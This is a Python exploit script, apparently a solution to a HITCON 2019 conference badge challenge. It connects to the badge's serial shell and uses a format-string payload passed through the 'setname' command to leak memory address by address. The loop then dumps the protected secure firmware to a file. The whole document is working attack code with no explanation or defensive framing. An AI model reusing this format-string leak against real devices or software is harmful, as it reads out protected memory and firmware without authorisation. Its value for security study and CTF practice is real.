#!/usr/bin/env python
from pwn import *
import serial , re , struct

s = serial.Serial( '/dev/tty.usbmodem14101' )

def readuntil( n ):
    buf = ''
    while True:
        c = s.read()
        buf += c
        if n in buf:
            return buf

prompt = 'HitconBadge2019 >> '

def shell( cmd ):
    s.write( cmd + '\r' )
    o = readuntil( prompt )
    #print o
    return o

def interactive():
    while True:
        try:
            cmd = raw_input().strip()
            if cmd == 'exit':
                break
            shell( cmd )
        except KeyboardInterrupt:
            break


secure_binary = ''

addr = 0
#addr = 0x1d0
offset = 0x12760
#offset = 0x50
end = addr + offset

while addr < end:
    print hex( len( secure_binary ) ) , hex( addr )
    fmt = '%d%d' + '%c' * 112 + '%s' * 1 + p32( addr )
    shell( 'setname -h ' + fmt.encode( 'hex' ) )
    o = shell( 'info' )
    
    l = len( hex( addr )[2:] )
    l = ( l + 1 ) / 2 if l & 1 else l / 2

    leak = re.findall( '%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(.*)\r\n' , o , re.DOTALL )[0][:-l]
    #print leak.encode( 'hex' )

    if 'null' in leak:
        leak = ''

    secure_binary += leak + '\0'
    addr += len( leak ) + 1

#print secure_binary.encode('hex')

f = open( 'Secure_dump.bin' , 'w' )
f.write( secure_binary )
f.close()

#interactive()